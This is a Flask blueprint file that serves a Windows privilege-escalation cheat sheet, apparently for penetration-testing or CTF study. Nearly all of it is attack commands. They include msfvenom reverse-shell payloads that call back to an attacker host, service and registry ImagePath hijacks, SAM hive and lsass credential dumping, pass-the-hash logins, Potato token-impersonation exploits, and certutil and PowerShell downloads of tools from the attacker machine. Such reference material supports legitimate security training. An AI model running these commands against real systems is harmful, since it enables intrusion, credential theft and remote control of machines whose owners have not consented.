from flask import Blueprint, render_template

bp = Blueprint("privesc_windows", __name__)

# Programs + commands. Structure follows Tib3rius "Windows Privilege Escalation".
CARDS = [
    {"title": "Automated tools", "hint": "Run one enumerator, then verify by hand.", "blocks": [
        {"tpl": "winPEASx64.exe", "lbl": "winPEAS (PEASS-ng)"},
        {"tpl": "winPEASany.exe quiet cmd fast"},
        {"tpl": "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"", "lbl": "PowerUp"},
        {"tpl": "SharpUp.exe audit", "lbl": "SharpUp"},
        {"tpl": "Seatbelt.exe -group=all", "lbl": "Seatbelt"},
        {"tpl": "accesschk.exe /accepteula -uwcqv \"Users\" *", "lbl": "accesschk (use v5.02 for /accepteula)"},
    ]},
    {"title": "Manual enumeration", "blocks": [
        {"tpl": "whoami /priv"},
        {"tpl": "whoami /groups"},
        {"tpl": "whoami /all"},
        {"tpl": "net user"},
        {"tpl": "net user %USERNAME%"},
        {"tpl": "net localgroup administrators"},
        {"tpl": "systeminfo"},
        {"tpl": "tasklist /svc"},
        {"tpl": "driverquery"},
        {"tpl": "ipconfig /all & route print & arp -a"},
        {"tpl": "netstat -ano"},
        {"tpl": "set", "lbl": "environment / PATH"},
    ]},
    {"title": "Kernel exploits", "hint": "Feed systeminfo to a suggester, then match a PoC to the build.", "blocks": [
        {"tpl": "systeminfo > systeminfo.txt"},
        {"tpl": "python wes.py systeminfo.txt -i \"Elevation of Privilege\" --exploits-only", "lbl": "WES-NG"},
        {"tpl": "python windows-exploit-suggester.py --database *.xls --systeminfo systeminfo.txt", "lbl": "windows-exploit-suggester (legacy)"},
        {"tpl": ". .\\Watson.ps1; Find-AllVulns", "lbl": "Watson"},
        {"tpl": "searchsploit \"Microsoft Windows Kernel\" <build>"},
        {"tpl": "# common: MS16-032, MS16-135, MS15-051, CVE-2021-36934 (HiveNightmare), CVE-2021-1675/34527 (PrintNightmare)", "lbl": "candidates", "plain": True},
    ]},
    {"title": "Services — insecure permissions", "hint": "SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS on a service = repoint its binary.", "blocks": [
        {"tpl": "accesschk.exe /accepteula -uwcqv \"%USERNAME%\" *"},
        {"tpl": "sc qc <service>"},
        {"tpl": "sc query <service>"},
        {"tpl": "powershell -c \"Get-ModifiableService -Verbose\"", "lbl": "PowerUp"},
        {"tpl": "sc config <service> binPath= \"cmd /c net localgroup administrators %USERNAME% /add\"", "lbl": "abuse"},
        {"tpl": "net stop <service> & net start <service>"},
        {"tpl": "powershell -c \"Invoke-ServiceAbuse -Name <service> -UserName '.\\%USERNAME%'\"", "lbl": "PowerUp abuse"},
    ]},
    {"title": "Services — unquoted service path", "hint": "Unquoted path + spaces + a writable earlier dir = drop your exe.", "blocks": [
        {"tpl": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\""},
        {"tpl": "powershell -c \"Get-UnquotedService\"", "lbl": "PowerUp"},
        {"tpl": "accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Some Dir\\\"", "lbl": "check dir write"},
        {"tpl": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o Some.exe"},
        {"tpl": "# copy Some.exe to the writable earlier path, then restart the service", "plain": True},
    ]},
    {"title": "Services — weak registry permissions", "hint": "Write access to a service's HKLM key lets you change ImagePath.", "blocks": [
        {"tpl": "powershell -c \"Get-ModifiableRegistryAutoRun\""},
        {"tpl": "accesschk.exe /accepteula \"%USERNAME%\" -kvuqsw hklm\\System\\CurrentControlSet\\Services"},
        {"tpl": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service>"},
        {"tpl": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Temp\\evil.exe\" /f", "lbl": "abuse"},
    ]},
    {"title": "Services — insecure service executable", "hint": "If the service binary itself is writable, swap it.", "blocks": [
        {"tpl": "accesschk.exe /accepteula -quvw \"%USERNAME%\" \"C:\\Path\\service.exe\""},
        {"tpl": "powershell -c \"Get-ModifiableServiceFile -Verbose\"", "lbl": "PowerUp"},
        {"tpl": "# back up original, copy payload over it, restart service, restore after", "plain": True},
    ]},
    {"title": "DLL hijacking", "hint": "Service/app loads a missing DLL from a writable dir on its search path.", "blocks": [
        {"tpl": "for %A in (\"%path:;=\";\"%\") do ( cmd.exe /c icacls \"%~A\" 2>nul | findstr /i \"everyone authenticated users todos\" )", "lbl": "writable PATH dirs"},
        {"tpl": "# use Procmon on a write host to spot NAME NOT FOUND on *.dll", "plain": True},
        {"tpl": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o hijack.dll"},
    ]},
    {"title": "Registry — AutoRuns", "hint": "Writable autorun binary runs at next (admin) logon.", "blocks": [
        {"tpl": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
        {"tpl": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"},
        {"tpl": "accesschk.exe /accepteula -wvu \"C:\\Path\\autorun.exe\""},
    ]},
    {"title": "AlwaysInstallElevated", "hint": "Both keys = 1 -> any MSI runs as SYSTEM.", "blocks": [
        {"tpl": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
        {"tpl": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
        {"tpl": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o evil.msi"},
        {"tpl": "msiexec /quiet /qn /i evil.msi", "lbl": "install"},
    ]},
    {"title": "Passwords — registry", "blocks": [
        {"tpl": "reg query HKLM /f password /t REG_SZ /s"},
        {"tpl": "reg query HKCU /f password /t REG_SZ /s"},
        {"tpl": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "lbl": "autologon"},
        {"tpl": "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s", "lbl": "PuTTY / WinSCP / VNC"},
    ]},
    {"title": "Saved credentials (runas)", "hint": "Stored creds run commands as another user without the password.", "blocks": [
        {"tpl": "cmdkey /list"},
        {"tpl": "runas /savecred /user:ADMIN \"C:\\Temp\\evil.exe\""},
    ]},
    {"title": "Config / unattend files", "blocks": [
        {"tpl": "dir /s *pass* == *.config"},
        {"tpl": "findstr /si password *.xml *.ini *.txt *.config"},
        {"tpl": "type C:\\Windows\\Panther\\Unattend.xml", "lbl": "unattend (base64 pass)"},
        {"tpl": "powershell -c \"Get-ChildItem C:\\ -Include *.config,*.ini,*.xml -File -Recurse -EA 0 | Select-String password\""},
    ]},
    {"title": "SAM & SYSTEM", "hint": "Dump local hashes; use with pass-the-hash.", "blocks": [
        {"tpl": "# C:\\Windows\\System32\\config\\{SAM,SYSTEM}  (locked live)", "plain": True},
        {"tpl": "# backups: C:\\Windows\\Repair  and  C:\\Windows\\System32\\config\\RegBack", "plain": True},
        {"tpl": "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive", "lbl": "with SeBackup / admin"},
        {"tpl": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL", "lbl": "impacket"},
    ]},
    {"title": "Pass-the-hash", "blocks": [
        {"tpl": "impacket-psexec -hashes :<NTHASH> Administrator@$RHOST"},
        {"tpl": "evil-winrm -i $RHOST -u Administrator -H <NTHASH>"},
        {"tpl": "pth-winexe -U 'Administrator%<LM>:<NTHASH>' //$RHOST cmd.exe"},
    ]},
    {"title": "Scheduled tasks", "hint": "Writable task script/binary run by a higher-priv user.", "blocks": [
        {"tpl": "schtasks /query /fo LIST /v"},
        {"tpl": "powershell -c \"Get-ScheduledTask | ? {$_.TaskPath -notlike '\\Microsoft*'} | ft TaskName,TaskPath,State\""},
        {"tpl": "accesschk.exe /accepteula -quvw \"%USERNAME%\" \"C:\\Path\\task.ps1\""},
    ]},
    {"title": "Startup apps", "hint": "Writable startup dir -> drop exe/lnk, fires at admin logon.", "blocks": [
        {"tpl": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""},
        {"tpl": "powershell -c \"Get-ModifiableRegistryAutoRun\""},
    ]},
    {"title": "Insecure GUI apps", "hint": "App running as admin with a File>Open dialog -> spawn cmd.", "blocks": [
        {"tpl": "tasklist /v | findstr /i admin"},
        {"tpl": "# in the dialog address bar: file://c:/windows/system32/cmd.exe", "plain": True},
    ]},
    {"title": "Installed applications", "blocks": [
        {"tpl": "wmic product get name,version"},
        {"tpl": "powershell -c \"Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select DisplayName,DisplayVersion\""},
        {"tpl": "searchsploit <app> <version>"},
    ]},
    {"title": "Token impersonation — Potato family", "hint": "whoami /priv shows SeImpersonate or SeAssignPrimaryToken -> SYSTEM.", "blocks": [
        {"tpl": "PrintSpoofer64.exe -i -c cmd", "lbl": "PrintSpoofer (Win10/2016-2019)"},
        {"tpl": "GodPotato-NET4.exe -cmd \"cmd /c whoami\"", "lbl": "GodPotato (2012-2022)"},
        {"tpl": "SigmaPotato.exe --revshell $LHOST $LPORT", "lbl": "SigmaPotato (8-11 / 2012-2022)"},
        {"tpl": "RoguePotato.exe -r $LHOST -e \"C:\\Temp\\evil.exe\" -l 9999", "lbl": "RoguePotato (needs 135)"},
        {"tpl": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c C:\\Temp\\evil.exe\" -t *", "lbl": "JuicyPotato (<= 2016 / 1809)"},
    ]},
    {"title": "Abusable token privileges", "hint": "From whoami /priv when a named privilege is enabled.", "blocks": [
        {"tpl": "reg save hklm\\sam sam & reg save hklm\\system system", "lbl": "SeBackupPrivilege -> read hives"},
        {"tpl": "robocopy /b C:\\Windows\\ntds . ntds.dit", "lbl": "SeBackup (DC)"},
        {"tpl": "# SeRestorePrivilege: overwrite a SYSTEM service binary or utilman.exe", "plain": True},
        {"tpl": "takeown /f C:\\Windows\\System32\\Utilman.exe", "lbl": "SeTakeOwnership"},
        {"tpl": "# SeDebug: procdump -ma lsass.exe  |  SeLoadDriver: Capcom.sys", "plain": True},
    ]},
    {"title": "getsystem / named pipe", "hint": "As local admin -> SYSTEM.", "blocks": [
        {"tpl": "getsystem", "lbl": "meterpreter (token dup / named pipe)"},
        {"tpl": "PsExec64.exe -accepteula -s -i cmd.exe", "lbl": "Sysinternals PsExec"},
    ]},
    {"title": "Port forwarding (reach local-only ports)", "hint": "Tunnel e.g. 135 for RoguePotato back to $LHOST.", "blocks": [
        {"tpl": "plink.exe -ssh -l kali -pw <pass> -R 135:127.0.0.1:135 $LHOST", "lbl": "plink"},
        {"tpl": "netsh interface portproxy add v4tov4 listenport=8009 connectport=8009 connectaddress=127.0.0.1"},
        {"tpl": "chisel.exe client $LHOST:8000 R:135:127.0.0.1:135", "lbl": "chisel"},
    ]},
    {"title": "Transfer from $LHOST", "blocks": [
        {"tpl": "certutil -urlcache -f http://$LHOST/winPEASx64.exe winPEAS.exe"},
        {"tpl": "powershell -c \"iwr http://$LHOST/nc.exe -o nc.exe\""},
        {"tpl": "copy \\\\$LHOST\\share\\tool.exe .", "lbl": "impacket-smbserver share . -smb2support"},
    ]},
]


@bp.route("/privesc/windows")
def index():
    return render_template("cheat.html", active="privesc_windows",
                           title="Windows privilege escalation", tag="privesc",
                           intro="Local privesc paths: enumeration, services, registry, credentials, tokens. Based on Tib3rius' Windows PrivEsc.",
                           cards=CARDS)


MODULE = {"id": "privesc_windows", "title": "Windows", "category": "Privilege Escalation",
          "order": 0, "blueprint": bp, "endpoint": "privesc_windows.index"}
